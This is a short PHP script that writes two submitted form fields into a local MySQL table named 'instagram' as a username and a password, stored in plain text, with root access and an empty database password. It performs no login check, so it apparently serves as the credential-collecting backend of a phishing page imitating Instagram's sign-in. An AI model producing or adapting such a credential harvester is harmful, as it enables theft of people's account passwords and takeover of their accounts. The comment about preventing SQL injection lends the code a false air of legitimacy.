<?php

$servername = "localhost:3307";
$username = "root";
$password = "";
$dbname = "instagram";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
    echo "<a href=index.html\"></a>";
}

// Using prepared statements to prevent SQL injection
$stmt = $conn->prepare("INSERT INTO instagram (username, password) VALUES (?, ?)");

if ($stmt === false) {
    die("Prepare failed: " . $conn->error);
}

// Bind parameters and execute
$a = isset($_POST['nm1']) ? $_POST['nm1'] : '';
$b = isset($_POST['nm2']) ? $_POST['nm2'] : '';

$stmt->bind_param("ss", $a, $b);
$stmt->execute();

$stmt->close();
$conn->close();
?>
